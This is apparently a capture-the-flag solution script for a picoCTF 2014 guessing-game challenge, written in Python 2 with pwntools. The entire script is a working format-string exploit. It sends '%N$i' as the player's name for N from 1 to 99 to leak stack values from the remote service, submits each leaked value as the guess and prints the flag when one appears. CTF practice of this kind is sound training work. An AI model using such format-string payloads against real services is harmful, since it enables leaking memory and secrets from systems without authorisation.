#!/usr/bin/env python2
import sys
from pwn import *

for i in xrange(1, 100):
	r = remote("vuln2014.picoctf.com", 4546)
	r.readuntil("Hello! What is your name?\n")
	r.send("%{}$i\n".format(i))
	r.readuntil("Welcome to the guessing game, ")
	guess = r.recvuntil("\n")
	print guess
	print r.recvuntil("What is your guess?\n")
	r.send(guess+"\n")
	output = r.recvall()
	if "flag" in output:
		print output
		sys.exit()
	else:
		r.close()
